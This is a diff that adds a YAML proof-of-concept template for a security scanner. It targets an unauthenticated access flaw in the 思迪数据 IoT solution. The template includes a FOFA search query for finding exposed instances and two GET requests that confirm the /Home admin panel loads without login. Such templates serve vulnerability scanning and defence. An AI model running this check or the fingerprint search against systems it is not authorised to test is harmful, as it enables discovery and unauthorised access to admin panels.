@@ -1,0 +1,18 @@
+id: poc-yaml-sdtec-data-home-login-bypass
+info:
+  name: 思迪数据 物联网解决方案 Home 登录绕过漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 思迪数据 物联网解决方案
+  fofa: body="思迪数据"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"思迪数据")
+- method: GET
+  path: /Home
+  expression: status_code == 200 && contains(body,"admin") && contains(body,"超级管理员")
+    && contains(body,"产品中心") && contains(body,"系统管理")
+variables: {}
+transport: http
